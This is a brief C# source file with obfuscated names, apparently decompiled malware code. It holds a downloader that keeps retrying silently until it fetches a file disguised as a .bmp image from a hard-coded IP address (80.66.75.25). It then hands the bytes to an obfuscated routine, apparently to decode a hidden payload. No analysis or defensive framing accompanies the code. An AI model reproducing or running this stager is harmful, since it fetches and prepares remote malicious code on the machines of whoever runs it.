using System;
using System.IO;
using System.Net;

internal class rhpw
{
	internal static byte[] mdyf()
	{
		return rhpx.brqu(mdyg("http://80.66.75.25/arx-Slkmrtswx_Vttmygcq.bmp"));
	}

	private static byte[] mdyg(string chvr)
	{
		while (true)
		{
			try
			{
				HttpWebResponse httpWebResponse = (HttpWebResponse)((HttpWebRequest)WebRequest.Create(new Uri(chvr))).GetResponse();
				using MemoryStream memoryStream = new MemoryStream();
				using Stream stream = httpWebResponse.GetResponseStream();
				byte[] array = new byte[4096];
				long num = 0L;
				int num2;
				while ((num2 = stream.Read(array, 0, array.Length)) > 0)
				{
					num += num2;
					memoryStream.Write(array, 0, num2);
				}
				return memoryStream.ToArray();
			}
			catch
			{
			}
		}
	}
}
